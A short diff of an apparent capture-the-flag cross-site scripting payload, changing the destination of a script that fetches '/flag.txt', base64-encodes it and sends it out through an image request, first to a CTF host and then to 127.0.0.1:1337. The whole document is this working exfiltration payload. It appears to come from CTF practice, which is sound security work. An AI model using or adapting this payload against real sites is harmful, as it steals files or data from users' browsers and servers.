@@ -2,7 +2,7 @@
 fetch('/flag.txt', {mode: 'no-cors'}).then(function(r) {
   r.text().then(function(f) {
     var img = document.createElement('img');
-    img.src = 'http://op1.ctf.euristica.in/' + btoa(f);
+    img.src = 'http://127.0.0.1:1337/' + btoa(f);
   })
 })
 </script>
